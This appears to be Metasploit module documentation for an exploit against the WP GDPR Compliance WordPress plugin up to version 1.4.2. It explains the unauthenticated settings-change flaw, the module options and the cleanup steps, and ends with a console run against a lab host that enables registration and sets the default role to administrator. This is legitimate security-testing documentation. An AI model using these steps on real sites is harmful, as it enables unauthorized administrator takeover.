## Vulnerable Application

This module exploits the [WP GDPR Compliance plugin](https://wordpress.org/plugins/wp-gdpr-compliance/)
lack of validation ([WPVDB 9144](https://wpscan.com/vulnerability/9144)), which affects versions 1.4.2 and lower.

When a user triggers GDPR-related actions, WordPress's `admin-ajax.php` is called
but the vulnerable plugin does not check capabilities before its `save_setting`
action. An unauthenticated request with a public frontend nonce can change
arbitrary WordPress settings. Version 1.4.3 moves settings changes to a separate
authenticated action with capability and option checks.

The module optionally changes the administration email, enables registration,
changes the default role to Administrator, and registers a user. Receiving the
WordPress account email and completing its password setup is separate from the
module's registration request. Registration alone does not prove administrator
access, particularly when testing fixed or differently configured installations.

The module retains accounts and changed settings. A later registration failure
can leave earlier configuration changes in place; operators must recover them.

Download [WP GDPR Compliance 1.4.2](https://downloads.wordpress.org/plugin/wp-gdpr-compliance.1.4.2.zip).
The [container targets](../../../../../test/module_targets/gdpr_compliance/README.md)
provide pinned archives and independent settings, mail, login and privilege
controls. The [verification report](../../../../../test/module_targets/VERIFICATION-20261117-gdpr-compliance.md)
records 22 passing cases in four selected profiles. Mail is captured by a local
transport inside the test container; external delivery is not tested.

## Verification Steps

1. Install the application
2. `./msfconsole`
3. `use auxiliary/admin/http/wp_gdpr_compliance_privesc`
4. `set RHOST [wp host]`
5. `set RPORT [wp port]`
6. `set EMAIL [email address]`
7. `run`
8. Receive the WordPress account email and complete password setup.
9. Log in and verify the account's role and administrator access independently.
10. Remove the test account and restore changed settings when finished.

## Options

### EMAIL

Required email address for the new account. Use an address where the operator can
receive WordPress account setup instructions.

### USER

Username to register, defaulting to `msfuser`. WordPress validates availability
and permitted username characters during registration.

### WPEMAIL

Optional advanced setting for the WordPress administration email. A syntactically
valid value is sent before registration settings are changed. The module does
not restore its previous value or suppress WordPress notification behavior.

## Scenarios

### Tested on Debian 9.6 running Wordpress 4.7.5 with WordPress GDPR Compliance plugin 1.4.2:

```
msf > use auxiliary/admin/http/wp_gdpr_compliance_privesc
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set verbose true
verbose => true
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set rhosts 172.22.222.145
rhosts => 172.22.222.145
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set email test@example.com
email => test@example.com
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > check

[*] Checking /wp-content/plugins/wp-gdpr-compliance/readme.txt
[*] Found version 1.4.2 of the plugin
[*] 172.22.222.145:80 The target appears to be vulnerable.
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > exploit

[*] Getting security token from host...
[!] Enabling user registrations...
[!] Setting the default user role type to administrator...
[*] Registering msfuser with email test@example.com
[*] Auxiliary module execution completed
msf auxiliary(admin/http/wp_gdpr_compliance_privesc) >
```
